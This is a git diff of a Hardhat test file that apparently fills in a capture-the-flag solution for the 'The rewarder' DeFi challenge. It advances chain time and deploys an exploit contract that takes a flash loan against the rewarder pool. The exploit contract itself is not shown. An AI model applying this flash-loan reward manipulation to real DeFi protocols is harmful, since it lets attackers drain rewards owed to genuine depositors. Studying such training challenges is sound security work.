@@ -1,5 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+// const { time } = require("@nomicfoundation/hardhat-network-helpers");
+
 
 describe('[Challenge] The rewarder', function () {
 
@@ -49,6 +51,7 @@ describe('[Challenge] The rewarder', function () {
         // Each depositor gets 25 reward tokens
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
+            // console.log(await this.rewarderPool.roundNumber());
             expect(
                 await this.rewardToken.balanceOf(users[i].address)
             ).to.be.eq(ethers.utils.parseEther('25'));
@@ -65,7 +68,10 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        const TheRewarderExploit = await ethers.getContractFactory('TheRewarderExploit', deployer);
+        this.exploit = await TheRewarderExploit.deploy();
+        this.exploit.exploit(this.flashLoanPool.address, this.rewarderPool.address, TOKENS_IN_LENDER_POOL);
     });
 
     after(async function () {
